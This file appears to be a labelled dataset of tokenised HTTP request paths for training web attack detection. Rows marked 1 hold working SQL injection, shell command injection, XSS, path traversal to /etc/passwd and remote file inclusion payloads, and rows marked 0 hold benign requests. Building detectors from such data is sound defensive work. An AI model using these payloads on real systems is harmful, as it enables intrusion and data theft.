request	label
/ string / strings / parameters = ;  str =  $  ( echo etahjn )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testziyq = 5055 ""  > "	1
/ string / strings / parameters = anjali 	0
/ examples / servlets / servlet / ncbook . cgi ? action = default & current =  | cat  / etc / passwd |  & form_tid = 996604045 & prev = main . html & list_message_index = 10 	1
/ string / strings / parameters = 1 '  )  and sleep ( 5 )  and  (  ' xecl '  like  ' xecl 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' lxyu '  from dual where 5789 = 5789 union all select null # 	1
/ string / modo = entrar '  + and +  ' 1 '  =  ' 1 & login = kaidanne & pwd = d67198tad4r6 & remember = on & b1 = entrar 	1
/ 1165685747381 / 	0
"/ string / modo = entrar & login = ivanyi0 & pwd = na + rbons ""  + and +  "" 1 ""  =  "" 1 & remember = off & b1 = entrar "	1
/ 1067041114693202 / 	0
/ mbweather / 	0
/ string / strings / parameters = & echo $ ifsghaymk $  (  ( 85 + 70 )  )  $  ( echo $ ifsghaymk ) ghaymk & 	1
/ string / strings / parameters = gareth 	0
/ string / strings / parameters = augusto 	0
/ string / strings / parameters = -1188 )  )  union all select 4711 -- 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as nejd where 2885 = 2885 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- "	1
/ javascript / item . conf 	0
"/  ?  < meta http-equiv = set-cookie content =  "" testggad = 2000 ""  > "	1
"/ string / strings / parameters = < link rel =  ""  "" stylesheet ""  ""  href =  ""  "" http :  /  / vulnerability-lab . com / crosssitescripting . css ""  ""  > "	1
/ string / strings / parameters = 8033 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  and sleep ( 5 )  # "	1
"/ top . php ? stuff =  ""  \ x0arm q36232773  # "	1
/ string / strings / parameters = '  ;  str =  $  ( echo pupqpk )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
"/ string / strings / parameters = 1 ""  ""  ; begin user_lock . sleep ( 5 )  ;  end and  ""  "" mdje ""  ""  like  ""  "" mdje "	1
/ bath_mats / 	0
/ string / modo = registro & login = gofron & password = emenda & nombre = ranger & apellidos = jalmar + arambide & emaila = avdjusko . polivitskiui @ javilasan . kr & dni = 43344488e & direccion = c /  + huerta + el + palomar ,  + s / n ,  +  & ciudad = moral + de + la + reina & cp = 26321 & provincia = navarra & ntc = 8906753589581639 & b1 = registrar 	1
/ 2623904780034295584kwhbax_th / 	0
/ legionarenacultofmithras / 	0
/ web datacards / 	0
/ 16476524 / 	0
/ string / strings / parameters = | echo lcijbi $  (  ( 90 + 7 )  )  $  ( echo lcijbi ) lcijbi | 	1
/ javascript / shoutbox . dll 	0
/ string / strings / parameters = 1366 	0
/ string / strings / parameters = encalador 	0
/ new_account / 	0
/ javascript / _vti_txt . cgi 	0
/ string / strings / parameters = 1 '  and 6414 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  ' lwir '  like  ' lwir 	1
/ 209319 / 	0
/ string / modo = registro & login = ala ' n & password = b1jed7ad & nombre = werner & apellidos = santiago + espejel & email = okeefe . gilger0 @ ajuntamentdebarcelona2-0 . in & dni = 87784817g & direccion = carretera + del + carmel + 99 +  & ciudad = ribafrecha & cp = 40331 & provincia = a + corua & ntc = 3867909567368782 & b1 = registrar 	1
/ string / strings / parameters = 29061025l 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo cjcsgg )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ string / strings / parameters = tutusaus tenza 	0
/ help . php ? q =  ' rm q38575663  # 	1
/ topvideo_box / 	0
/ string / strings / parameters = 1 '  in boolean mode )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  # 	1
/ string / id = 2 & nombre = jamn + ibrico & precio = 85 & cantidad = 8 & b1 = aadir + al + carrito 	0
/ index115944 / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo zepyms )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi 	1
/ javascript / full . trace 	0
/ struggle_ratification / 	0
/ string / strings / parameters = semicopado 	0
/ depreps / 	0
/ string / modo = registro & login = litherla & password = calisaya & nombre = eduino & apellidos = alfonso & email = manez @ lecriture . gn & dni = 74835105m & direccion = c /  + codigo + correspondencia + oficial + correos-telegrafos + 71 ,  + 10d & ciudad = santa + cristina + de + valmadrigal & cp = 34310 & provincia = len & ntc = 7709760846022131 & b1 = registrar 	0
/ examples / servlets / servlet / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331904404 '  )  <  / script > 	1
/ services_solutions / 	0
/ scripts / search . scr . php ? globals [ pth ]  [ classes ]  = xxpathxx ? 	1
/ string / strings / parameters = 1 '  )  where 8211 = 8211 union all select null , null , null , null , null # 	1
/ string / strings / parameters = laurinda 	0
/ nav_advertise / 	0
/ scripts / index . php ? action = login & languages [ nessus ]  = syscp_1211 . nasl & language = nessus & langs [ nessus ]  [ 0 ]  [ file ]  =  / etc / passwd 	1
/ javascript / procurement . exe 	1
"/ string / strings / parameters = -7107 ""  ""  )  )  )  order by 1 # "	1
/ string / modo = entrar & login = cheng & pwd = cazc , alear & remember = off & b1 = entrar 	1
/ string / strings / parameters = 1 )  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null ) 	1
/ string / strings / parameters = constante 	0
/ string / strings / parameters = $  { exec ( print (  ` echo yymyqb ; echo  $  (  ( 54 + 65 )  )  ; echo yymyqb ; echo yymyqb `  )  ;  \  \ yymyqb 	1
/ 108-796 / 	0
/ string / modo = insertar & precio = 8460 & b1 = confirmar / 	1
/ string / strings / parameters = 7o14c0o 	0
/ index . php ? file_name [  ]  = xxpathxx ? 	1
/ 173098 / 	0
/ contenido_4 . 8 . 4 / contenido / cronjobs / run_newsletter_job . php ? cfg [ path ]  [ contenido ]  = xxpathxx ? 	1
"/ string / strings / parameters = < a href =  ""  /  /  ͥ . ws ""  > click "	1
/ string / modo = registro & login = kinnie & password = ret4ne3or & nombre = graziana & apellidos = valentino + ruiz & email = vettenranta @ infopromo . az & dni = 09220629k & direccion = el + caaveral + 130 ,  + 5-f & ciudad = lezama & cp = 16648 & provincia = jan & ntc = 9139561296743472 & b1 = registrar 	0
"/ top . php ? stuff =  ""  & ver \ x0b > q72181135 & rem \ x0b "	1
/ javascript / msadm . exe 	1
"/ en-us / hipkz026 . fts ?  < meta http-equiv = set-cookie content =  "" testyrbs = 2855 ""  > "	1
/ string / strings / parameters = '  |   [  7 -ne  $  ( echo iqybmk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ money65_funds / 	0
/ string / modo = registro & login = mallorie & password = ha6agar & nombre = vinicio & apellidos = espinoza + blancarte & email = fischetti . bacall @ players . com . gr & dni = 66376502c & direccion = germanies + 18 ,  +  & ciudad = itrabo & cp = 46660 & provincia = asturias & ntc = 2812685253359971 & b1 = registrar 	0
/ robocup / 	0
/ string / strings / parameters = < body / onactivate = alert ( 1 )  > 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' xhcr '  from dual where 9279 = 9279 ; iif ( 2452 = 8999 , 1 , 1 / 0 ) 	1
/ string / strings / parameters = -9574 '  )  as rxym where 4719 = 4719 union all select 4719 , 4719 , 4719 , 4719 , 4719 , 4719 , 4719 -- 	1
/ string / strings / parameters = 95690740e 	0
/ string / strings / parameters = 1 '  )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 ) 	1
/ examples / jsp / error / jgs_portal_statistik . php ? meinaction = themen & month = 1 & year = 1 ' 	1
/ list2_icon1 / 	0
/ viewopenings / 	0
/ using_lprng / 	0
/ string / strings / parameters = johann 	0
/ string / strings / parameters = -5165 '  )  )  or 1570 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  ' zpnv '  like  ' zpnv 	1
/ docs_r62 / 	0
/ javascript / vfs . exe 	1
/ string / strings / parameters = 9490117587717675 	0
/ recordings / forum_2 . php ? msg = 10 & return =  < script > foo <  / script > 	1
/ fight_against_sexual_exploitation_of_children / 	0
/ string / strings / parameters = vilaubi hosta 	0
/ string / strings / parameters = 6002328199807748 	0
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo vgafpt )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ string / modo = registro & login = broussar & password = cartagenero & nombre = edelmar & apellidos = gambs + galatioto & email = padoan @ directoriogratuito . et & dni = 77731441c & direccion = c /  + nogueira ,  + 86 + 11b & ciudad = arguisuelas & cp = 25514 & provincia = ourense & ntc = 7752644300025700 & b1 = registrar 	0
/ 000096034 / 	0
/ pluginword / 	0
/ string / strings / parameters = plaza del yunque , 	0
"/ string / strings / parameters = < a href =  ""  "" http :  /  / www . google . com ""  ""  > crosssitescripting <  / a > "	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testulex = 4996 ""  > "	1
/ string / modo = registro & login = silvie & password = metacntrico & nombre = telsfora & apellidos = pao + villalobos & email = soldati @ legami . so & dni = 96399738e & direccion = c /  + padre + francisco + s / n ,  +  & ciudad = alfafara & cp = 29380 & provincia = la + rioja & ntc = 1246947052735749 & b1 = registrar 	0
/ string / strings / parameters = $  { exec ( print (  ` echo twzntz \ necho  $  (  ( 85 + 67 )  )  \ necho twzntz \ necho twzntz `  )  ;  # twzntz 	1
/ 182763 / 	0
/ msg675932 / 	0
/ javascript / viewvc . mdb 	0
/ episodes / 	0
/ javascript / sample . stackdump 	0
"/ string / strings / parameters = '  |   [  5 -ne  $  ( echo jvvwqm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
"/ admin . php ?  ""  >  < script > alert ( 409956083318 )  <  / script >  <  "" "	1
/ fcgi-bin / gw5 / gwweb . exe ? help = bad-request 	1
/ ros_taylor / 	0
/ string / strings / parameters = 95937804c 	0
/ javascript /  . passwd . mdb 	1
"/ string / strings / parameters = ""  & echo ccwsns $  (  ( 52 + 72 )  )  $  ( echo ccwsns ) ccwsns | "	1
/ 357427 / 	0
/ string / modo = registro & logina = rokas & password = telarejo & nombre = sin & apellidos = eraso + rebes & email = lapotaire @ psicoencuentronline . cc & dni = 32760470y & direccion = c /  + los + arces ,  + 155 ,  +  & ciudad = castejn + del + puente & cp = 40314 & provincia = girona & ntc = 8177793043919155 & b1 = registrar 	1
/ string / strings / parameters = 1 '  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  ' svhx '  =  ' svhx 	1
/ javascript / includes . jsp 	0
/ javascript / announcement . phtml 	0
/ string / strings / parameters = < style > p [ foo = bar {  }  *  { -o-link :  ' javascript : confirm ( 1 )  '  }  {  }  *  { -o-link-source : current }  *  { background : red }  ]  { background : green }  ;  <  / style > 	1
"/ zabbix / frontends / php / locales . php ? download = 1 & langto = 1 & extlang [  ""  . system (  ' chmod + 777 +  / tmp / tyrovghehq . sh '  )  .  ""  ]  = 1 "	1
/ business_people / 	0
/ javascript / controller . csproj 	0
/ astereo / 	0
/ string / strings / parameters = glyn7 	0
/ javascript / https . vbs 	0
/ string / id = 2 & nombre = queso + manchego & precio = 85 & cantidad = 12 & b1 = aadir + al + carrito 	0
/ baylor / 	0
/ string / strings / parameters = <  !  [ cdata [  < script > var n = 0 ; while ( true )  { n +  +  ;  }  <  / script >  ]  ]  > 	1
/ string / strings / parameters = 1 )  )  )  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 -- 	1
"/ main . php ? logout =  ""  & sleep \ x099 \ x09 # "	1
/ string / strings / parameters = |   [  5 -ne  $  ( echo pdveeq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
/ enc / content . php ? home_path = xxpathxx ? 	1
"/ string / strings / parameters = ""  )  )  )  )  and 0 = benchmark ( 3000000 , md5 ( 1 )  )   /  * "	1
/ string / strings / parameters = 42798379w 	0
"/ t3af3tdz . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = velero @ softwaresaas . ec 	0
/ javascript / tree . bz2 	0
/ string / strings / parameters = |   [  7 -ne  $  ( echo hzzokr  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ string / modo = insertar & precio = 7340 & b1 = pasar + por + caja 	0
/ string / id = 2 /  & nombre = queso + manchego & precio = 85 & cantidad = 15 & b1 = aadir + al + carrito 	1
/ javascript / reg . rhtml 	0
/ string / modo = registro & login = lowe & password = 26ti8er2st5ltic9 & nombre = nathaniel & apellidos = ledesma + palls & email = durning_assaf @ nutrimama . ie & dni = 77753227w & direccion = calle + h * elsinki ,  *  + 78 ,  +  & ciudad = calafell & cp = 33800 & provincia = cantabria & ntc = 5488808087081564 & b1 = registrar 	1
/ string / modo = registro & login = helem & password = aparecer & nombre = pancho & apellidos = goldaratz + brizuela & email = lahbib_hodo @ silver-knights . ie & dni = 54489862x & direccion = berlin + 116 +  & ciudad = sudanell & cp = 24346 & provincia = burgos & ntc = 011349048658532 & b1 = registrar 	1
/ 971800919 / 	0
/ string / strings / parameters = remo 	0
/ javascript / updater . aspx 	0
/ litter / 	0
/ string / modo = registro & login = gidaro & password = tetona & nombre = maijhara & apellidos = pirla & email = porel @ xslive . sd & dni = 81338514a & direccion = los + caprichos + 126 +  & ciudad = fuentiduea & cp = 25480 & provincia = albacete & ntc = 3317651896955813 & b1 = registrar 	0
"/ string / strings / parameters = >  ""  ""  < meta http-equiv =  ""  "" set-cookie ""  ""  content =  ""  "" userid =  < script > document . cookie = true <  / script >  ""  ""  > "	1
/ examples / jsp / cal / cvslog . cgi ? file =  < script > window . alert <  / script > 	1
/ string / modo = registro & login = bagnato33 & password = prescindible & nombre = hiram '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & apellidos = penagos + pijoan & email = fenell @ salsaspain . fr & dni = 11130412e & direccion = c /  + leon + pinelo ,  + 5 + 3e & ciudad = cordovilla & cp = 10320 & provincia = navarra & ntc = 2582130639764727 & b1 = registrar 	1
/ 142156 / 	0
"/ string / modo = registro & login = colline & password = h30i2o & nombre = sylvina & apellidos = mateu + bernaus & email = paros ""  style =  "" background : url ( javascript : alert (  ' paros '  )  )  & dni = 75667654t & direccion = c /  + del + torrent + de + l ' olla ,  + 111 + 11 ? d & ciudad = fuerte + del + rey & cp = 49610 & provincia = guadalajara & ntc = 5880986678228634 & b1 = registrar "	1
/ string / strings / parameters = 1 '  )  as zdhq where 5586 = 5586 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ string / strings / parameters = quintanilla del coco 	0
/ javascript / 23 . rhtml 	0
/ string / strings / parameters = lug5r 	0
/ interface / login / login_frame . php ? site =  < script > alert ( owasp zap )  ;  <  / script >  '  ; waitfor delay  ' 0 : 0 : 15 '  ;  -- 	1
/ n-track studio 4 / 	0
/ examples / servlets / servlet / htgrep / file = index . html & hdr =  / etc / passwd 	1
/ grave_gifts / 	0
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo hsdbta )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  & "	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 39 /  & cantidad = 64 & b1 = aadir + al + carrito 	1
/ 045225 / 	0
/ bemarket / postscript / postscript . php ? p_mode = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
/ string / strings / parameters = 1 '  )  and make_set ( 4551 = 6487 , 6487 )  and  (  ' jnqa '  =  ' jnqa 	1
/ string / strings / parameters = 21510 	0
/ string / strings / parameters = kannel 	0
/ 044640 / 	0
/ string / strings / parameters = 1 )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  ( 5098 = 5098 	1
/ books / home . php ? home = xxpathxx 	1
/ examples / jsp / checkbox / search 	0
/ relea00153 / 	0
/ phpmyadmin / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1 	1
/ string / strings / parameters = di9l 	0
/ string / strings / parameters = ex27mulgar 	0
/ string / strings / parameters = 1 '  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo lvmwxb )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ string / modo = insertar & precio = 1820 & b1 = confirmar 	0
/ string / modo = registro & login = corey & password = catatipia & nombre = viataiano & apellidos = tracisto + arroyave & email = vildo @ prensahp . fj & dni = 40139732v & direccion = cabrera ,  + 199 +  & ciudad = sabinigo & cp = 30840 & provincia = valladolid & ntc = 4895228374639979 & b1 = registrar 	0
"/ en-us / n9xlumt5 . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = ""  )  ; waitfor delay  ' 0 : 0 : __time__ '  -- "	1
"/ string / strings / parameters = ""  . print (  ` echo dshoev echo  $  (  ( 44 + 47 )  )  echo dshoev echo dshoev `  )  ;  # dshoev "	1
/ 115638681 / 	0
/ string / id = 3 & nombre = ques + o + manchego & precio = 39 & cantidad = 65 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = 68170319k 	0
/ string / strings / parameters = | echo $ ifsladzja $  (  ( 28 + 57 )  )  $  ( echo $ ifsladzja ) ladzja & 	1
"/ string / strings / parameters = echo $ ifsjcteqy $  (  ( 49 + 31 )  )  $  ( echo $ ifsjcteqy ) jcteqy "" "	1
"/ m2fpztty . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 1 where 5925 = 5925 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
